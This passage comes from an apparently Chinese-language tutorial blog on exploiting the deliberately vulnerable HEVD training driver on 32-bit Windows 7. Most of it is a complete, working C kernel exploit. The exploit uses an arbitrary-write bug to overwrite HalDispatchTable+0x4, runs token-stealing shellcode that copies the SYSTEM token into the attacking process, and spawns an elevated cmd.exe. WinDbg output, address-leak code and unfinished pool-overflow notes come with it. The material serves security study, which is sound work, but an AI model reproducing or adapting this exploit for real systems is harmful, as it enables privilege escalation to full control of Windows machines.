   <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, Buffer, <span class="number">8</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;recvBuf, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp的话：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">what -&gt; &amp;payload</span><br><span class="line">where -&gt; HalDispatchTable+<span class="number">0x4</span></span><br></pre></td></tr></table></figure>

<p>windbg：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">****** HEVD_IOCTL_ARBITRARY_WRITE ******</span><br><span class="line">[+] UserWriteWhatWhere: 0x004B2E60</span><br><span class="line">[+] WRITE_WHAT_WHERE Size: 0x8</span><br><span class="line">[+] UserWriteWhatWhere-&gt;What: 0x41414141</span><br><span class="line">[+] UserWriteWhatWhere-&gt;Where: 0x41414141</span><br><span class="line">[+] Triggering Arbitrary Write</span><br><span class="line">[-] Exception Code: 0xC0000005</span><br><span class="line">****** HEVD_IOCTL_ARBITRARY_WRITE ******</span><br></pre></td></tr></table></figure>

<p>可以看到成功控制了What和where</p>
<h2 id="内核提权–HalDispatchTable"><a href="#内核提权–HalDispatchTable" class="headerlink" title="内核提权–HalDispatchTable"></a>内核提权–HalDispatchTable</h2><p>有一个未文档化的函数 <code>NtQueryIntervalProfile</code>，调用了 <code>KeQueryIntervalProfile</code> 函数，<code>KeQueryIntervalProfile</code>会执行这么一段汇编代码 <code>call [HalDispatchTable+0x4]</code>，并且对于 <code>[HalDispatchTable+0x4]</code> 的修改不会破坏系统的稳定性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; uf nt!KeQueryIntervalProfile+0x14</span><br><span class="line">nt!KeQueryIntervalProfile+0x14:</span><br><span class="line">840df60e 8945f0          mov     dword ptr [ebp-10h],eax</span><br><span class="line">840df611 8d45fc          lea     eax,[ebp-4]</span><br><span class="line">840df614 50              push    eax</span><br><span class="line">840df615 8d45f0          lea     eax,[ebp-10h]</span><br><span class="line">840df618 50              push    eax</span><br><span class="line">840df619 6a0c            push    0Ch</span><br><span class="line">840df61b 6a01            push    1</span><br><span class="line">840df61d ff155cf3f383    call    dword ptr [nt!HalDispatchTable+0x4 (83f3f35c)]</span><br><span class="line">840df623 85c0            test    eax,eax</span><br><span class="line">840df625 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (840df632)  Branch</span><br></pre></td></tr></table></figure>

<p><code>HalDispatchTable</code>是内核中的一个系统调用表，当获得任意地址写的能力之后，可以使用<code>shellcode</code>地址覆盖<code>HalDispatchTable</code>第二个成员处的<code>HalQuerySystemInformation</code>函数地址</p>
<p><code>HalDispatchTable</code>这个内核服务函数指针表，结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HAL_DISPATCH HalDispatchTable = &#123;</span><br><span class="line">    HAL_DISPATCH_VERSION,</span><br><span class="line">    xHalQuerySystemInformation,<span class="comment">//此处</span></span><br><span class="line">    xHalSetSystemInformation,</span><br><span class="line">    xHalQueryBusSlots,</span><br><span class="line">    xHalDeviceControl,</span><br><span class="line">    xHalExamineMBR,</span><br><span class="line">    xHalIoAssignDriveLetters,</span><br><span class="line">    xHalIoReadPartitionTable,</span><br><span class="line">    xHalIoSetPartitionInformation,</span><br><span class="line">    xHalIoWritePartitionTable,</span><br><span class="line">    xHalHandlerForBus,                  <span class="comment">// HalReferenceHandlerByBus</span></span><br><span class="line">    xHalReferenceHandler,               <span class="comment">// HalReferenceBusHandler</span></span><br><span class="line">    xHalReferenceHandler                <span class="comment">// HalDereferenceBusHandler</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>所以接下来要做的就是：找到<code>HalDispatchTable</code>地址并覆盖第二个值， 之后调用<code>NtQueryIntervalProfile</code>执行shellcode </p>
<p><code>HalDispatchTable</code>是由内核模块导出的。要得到 <code>HalDispatchTable</code>在内核中的准确地址，首先要得到内核下<code>ntkrnlpa.exe</code>模块的基址，再加上用户态下<code>HalDispatchTable</code>与用户态下<code>ntkrnlpa.exe</code>模块基址二者计算得出的偏移量即可得到内核下 <code>HalDispatchTable</code> 的地址，其中<code>HalDispatchTable+0x4</code>即可得到 <code>xHalQuerySystemInformation</code>函数地址。</p>
<p>流程：</p>
<ol>
<li>使用 <code>EnumDeviceDrivers</code> 来获取 <code>ntkrnlpa.exe</code> 在内核中的基地址</li>
<li>使用 <code>LoadLibrary</code> 将 <code>ntkrnlpa.exe</code> 加载到用户空间中并得到它的基地址</li>
<li>使用 <code>GetProcAddress</code> 来得到 <code>HalDispatchTable</code> 在用户空间中的地址</li>
<li>计算出 <code>HalDispatchTable</code> 与 <code>ntkrnlpa.exe</code> 的基地址的差值</li>
<li>将这个差值加到 <code>ntkrnlpa.exe</code> 在内核中的基地址上得到 <code>HalDispatchTable</code> 在内核中的地址</li>
</ol>
<p>获取<code>ntkrnlpa.exe</code> 在内核中的基地址,文件头<code>Psapi.h</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">NtkrnlpaBase</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LPVOID lpImageBase[<span class="number">1024</span>];</span><br><span class="line">    DWORD lpcbNeeded;</span><br><span class="line">    TCHAR lpfileName[<span class="number">1024</span>];</span><br><span class="line">    <span class="comment">//Retrieves the load address for each device driver in the system</span></span><br><span class="line">    EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase), &amp;lpcbNeeded);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//Retrieves the base name of the specified device driver</span></span><br><span class="line">        GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, <span class="number">48</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(lpfileName, <span class="string">&quot;ntkrnlpa.exe&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]success to get %s\n&quot;</span>, lpfileName);</span><br><span class="line">            <span class="keyword">return</span> lpImageBase[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ntkrnlpa.exe 在 user mode 中的基地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HMODULE hUserSpaceBase = LoadLibrary(<span class="string">&quot;ntkrnlpa.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>HalDispatchTable 在 user mode 中的地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, <span class="string">&quot;HalDispatchTable&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>计算 HalDispatchTable+0x4 的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + <span class="number">0x4</span>;</span><br></pre></td></tr></table></figure>



<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>由于没有恢复<code>xHalQuerySystemInformation</code>初始环境，所以一旦利用了关机就会蓝屏，可以保存下原来<code>xHalQuerySystemInformation</code>的值，之后填回去</p>
<p>完整Exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;profileapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Write_What_Where 0x22200B <span class="comment">// 这个是进入TriggerArbitraryWrite的IoControlCode</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span> // 定义载入到驱动文件的结构体</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PULONG_PTR What;</span><br><span class="line">    PULONG_PTR Where;</span><br><span class="line">&#125; WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(WINAPI *NtQueryIntervalProfile_t)</span><span class="params">( <span class="comment">// 这个是函数NtQueryIntervalProfile专属的结构体</span></span></span><br><span class="line"><span class="params">    IN ULONG ProfileSource,</span></span><br><span class="line"><span class="params">    OUT PULONG Interval)</span>;</span><br><span class="line"></span><br><span class="line">HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">ShellCode</span><span class="params">()</span> <span class="comment">// 将SYSTEM进程的Token覆盖本进程Token</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">		pushad; 保存各寄存器数据</span><br><span class="line">		; start of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">		xor eax, eax; eax设置为<span class="number">0</span></span><br><span class="line">		mov eax, fs: [eax + <span class="number">124</span>h]; 获取 nt!_KPCR.PcrbData.CurrentThread</span><br><span class="line">		mov eax, [eax + <span class="number">050</span>h]; 获取 nt!_KTHREAD.ApcState.Process</span><br><span class="line">		mov ecx, eax; 将本进程EPROCESS地址复制到ecx</span><br><span class="line">		mov edx, <span class="number">4</span>; WIN <span class="number">7</span> SP1 SYSTEM process PID = <span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">		SearchSystemPID:</span><br><span class="line">		mov eax, [eax + <span class="number">0b</span>8h]; 获取 nt!_EPROCESS.ActiveProcessLinks.Flink</span><br><span class="line">			sub eax, <span class="number">0b</span>8h</span><br><span class="line">			cmp[eax + <span class="number">0b</span>4h], edx; 获取 nt!_EPROCESS.UniqueProcessId</span><br><span class="line">			jne SearchSystemPID; 循环检测是否是SYSTEM进程PID</span><br><span class="line"></span><br><span class="line">			mov edx, [eax + <span class="number">0f</span>8h]; 获取System进程的Token</span><br><span class="line">			mov[ecx + <span class="number">0f</span>8h], edx; 将本进程Token替换为SYSTEM进程 nt!_EPROCESS.Token</span><br><span class="line">			; End of Token Stealing Stub</span><br><span class="line"></span><br><span class="line">			popad; 恢复各个寄存器数据</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 启动一个使用本进程Token的CMD</span></span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">CreateCmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    STARTUPINFO si = &#123;<span class="keyword">sizeof</span>(si)&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_SHOW;</span><br><span class="line">    WCHAR wzFilePath[MAX_PATH] = &#123;<span class="string">L&quot;cmd.exe&quot;</span>&#125;;</span><br><span class="line">    BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span> (bReturn)</span><br><span class="line">        CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPVOID <span class="title function_">NtkrnlpaBase</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    LPVOID lpImageBase[<span class="number">1024</span>]; <span class="comment">// 驱动基地址数组</span></span><br><span class="line">    DWORD lpcbNeeded;         <span class="comment">// lpImageBase[]返回的字节数</span></span><br><span class="line">    TCHAR lpfileName[<span class="number">1024</span>];   <span class="comment">// 驱动名称</span></span><br><span class="line"></span><br><span class="line">    EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase), &amp;lpcbNeeded); <span class="comment">// 获取每个驱动进程的基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Retrieves the base name of the specified device driver</span></span><br><span class="line">        GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, <span class="number">48</span>); <span class="comment">// 根据每个驱动列表列出对应的驱动名称</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span> *)lpfileName, <span class="string">&quot;ntkrnlpa.exe&quot;</span>)) <span class="comment">// 判断是否找到ntkrnlpa.exe</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]success to get %s\n&quot;</span>, lpfileName);</span><br><span class="line">            <span class="keyword">return</span> lpImageBase[i]; <span class="comment">// 将ntkrnlpa.exe驱动进程的基地址返回</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD32 <span class="title function_">GetHalOffset_4</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ntkrnlpa.exe in kernel space base address</span></span><br><span class="line">    PVOID pNtkrnlpaBase = NtkrnlpaBase();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]ntkrnlpa base address is 0x%p\n&quot;</span>, pNtkrnlpaBase);</span><br><span class="line"></span><br><span class="line">    HMODULE hUserSpaceBase = LoadLibraryA(<span class="string">&quot;ntkrnlpa.exe&quot;</span>); <span class="comment">// 获取ntkrnlpa.exe在用户层的地址</span></span><br><span class="line"></span><br><span class="line">    PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, <span class="string">&quot;HalDispatchTable&quot;</span>);   <span class="comment">// 找到用户层下的ntkrnlpa.exe中HalDispatchTable的地址</span></span><br><span class="line">    DWORD32 UserSpaceoffset = (DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase; <span class="comment">// 通过获取到的用户层ntkrnlpa.exe基址和HalDispatchTable地址获取到偏移量</span></span><br><span class="line">    DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + (DWORD32)UserSpaceoffset + <span class="number">0x4</span>;        <span class="comment">// 找到HalDispatchTable+0x4在内核空间中的地址</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]HalDispatchTable+0x4 is 0x%p\n&quot;</span>, hal_4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (DWORD32)hal_4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">Trigger_shellcode</span><span class="params">(DWORD32 where, DWORD32 what)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    WRITE_WHAT_WHERE exploit;</span><br><span class="line">    DWORD lpbReturn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    exploit.Where = (PULONG_PTR)where;</span><br><span class="line">    exploit.What = (PULONG_PTR)&amp;what;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Write at 0x%p\n&quot;</span>, where);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Write with 0x%p\n&quot;</span>, what);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Start to trigger...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DeviceIoControl(hDevice,</span><br><span class="line">                    Write_What_Where,</span><br><span class="line">                    &amp;exploit,</span><br><span class="line">                    <span class="keyword">sizeof</span>(WRITE_WHAT_WHERE),</span><br><span class="line">                    <span class="literal">NULL</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    &amp;lpbReturn,</span><br><span class="line">                    <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Success to trigger...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Get HANDLE</span></span><br><span class="line">    hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">                          GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">                          <span class="literal">NULL</span>,</span><br><span class="line">                          <span class="literal">NULL</span>,</span><br><span class="line">                          OPEN_EXISTING,</span><br><span class="line">                          <span class="literal">NULL</span>,</span><br><span class="line">                          <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Start to get HANDLE...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Success to get HANDLE!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD interVal = <span class="number">0</span>;</span><br><span class="line">    hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>,</span><br><span class="line">                          GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">                          <span class="literal">NULL</span>,</span><br><span class="line">                          <span class="literal">NULL</span>,</span><br><span class="line">                          OPEN_EXISTING,</span><br><span class="line">                          <span class="literal">NULL</span>,</span><br><span class="line">                          <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Start to get HANDLE...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE || hDevice == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Failed to get HANDLE!!!\n&quot;</span>);</span><br><span class="line">        <span class="comment">// system(&quot;pause&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Success to get HANDLE!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DWORD32 Hal_hook_address = GetHalOffset_4();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]HalDispatchTable+0x4 is 0x%p\n&quot;</span>, Hal_hook_address);</span><br><span class="line"></span><br><span class="line">    Trigger_shellcode((DWORD)Hal_hook_address, (DWORD)&amp;ShellCode);</span><br><span class="line"></span><br><span class="line">    NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQueryIntervalProfile&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]NtQueryIntervalProfile address is 0x%x\n&quot;</span>, NtQueryIntervalProfile);</span><br><span class="line">    NtQueryIntervalProfile(<span class="number">0x1337</span>, &amp;interVal);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]Start to Create cmd...\n&quot;</span>);</span><br><span class="line">    CreateCmd();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="5-PoolOverflow-TriggerBufferOverflowNonPagedPool-待完善"><a href="#5-PoolOverflow-TriggerBufferOverflowNonPagedPool-待完善" class="headerlink" title="5.PoolOverflow-TriggerBufferOverflowNonPagedPool(待完善)"></a>5.PoolOverflow-TriggerBufferOverflowNonPagedPool(待完善)</h1><p>本部分为非换页池溢出漏洞分析利用</p>
<h2 id="前置知识点（待完成）"><a href="#前置知识点（待完成）" class="headerlink" title="前置知识点（待完成）"></a>前置知识点（待完成）</h2><p>UAF：简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
<ul>
<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
</ul>
<p><strong>一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong></p>
<h3 id="NonPagedPool"><a href="#NonPagedPool" class="headerlink" title="NonPagedPool"></a>NonPagedPool</h3><p>用户空间是从“堆(Heap)”分配缓冲区的，内核中也有类似的机制，但是不叫“堆”而称为“池(Pool)”。不过二者有着重要的区别。</p>
<p>首先，用户空间的堆是属于进程的；而内核中的池则是全局的，属于整个系统。堆所占的是虚存空间，堆的扩充基本上体现在作为后备存储的页面倒换文件的扩充，而不必同时占用那么多的物理页面。</p>
<p>而内核中的池则分成两种：</p>
<ul>
<li>一种是所占页面不可倒换的，每个页面不管其是否受到访问都真金白银地占着物理页面，要求这种池的大小可扩充显然不现实。</li>
<li>另一种是所占页面可以倒换的，这种池的大小倒是可以扩充，因为(已分配而）暂时不受访问的（虚存）页面可以被倒换到作为后备的页面倒换文件中。</li>
</ul>
<p>换页内存池和非换页内存池则是提供给系统内核模块和设备驱动程序使用的。在换页内存池中分配的内存有可能在物理内存紧缺的情况下被换出到外存中;而非换页内存池中分配的内存总是处于物理内存中。</p>
<p><img src="/2023/08/12/2023-8-HEVD/921642_AWSZ3WP3XJW7EN8.jpg" alt="img"></p>
<p>windows内核中定义了许多不同的池：</p>
<p>实际使用的基本上就是<code>NonPagedPool</code> 和 <code>PagedPool</code> 两个。</p>
